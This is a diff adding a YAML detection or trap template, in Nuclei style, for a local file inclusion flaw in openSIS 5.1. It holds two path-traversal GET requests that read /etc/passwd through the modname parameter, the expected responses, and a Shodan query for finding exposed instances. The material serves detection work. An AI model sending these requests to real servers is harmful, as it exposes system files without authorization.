@@ -1,0 +1,38 @@
+id: opensis-lfi
+info:
+  name: openSIS 5.1 - Local File Inclusion
+  author: pikpikcu
+  description: openSIS 5.1 is vulnerable to local file inclusion and allows attackers
+    to obtain potentially sensitive information by executing arbitrary local scripts
+    in the context of the web server process. This may allow the attacker to compromise
+    the application and computer; other attacks are also possible.
+  severity: high
+  reference:
+  - https://www.exploit-db.com/exploits/38039
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  metadata:
+    max-request: 2
+    shodan-query: http.title:"openSIS"
+  tags: opensis,lfi,edb
+traps:
+- request:
+    method: GET
+    path: /opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: root:[x*]:0:0
+- request:
+    method: GET
+    path: /ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
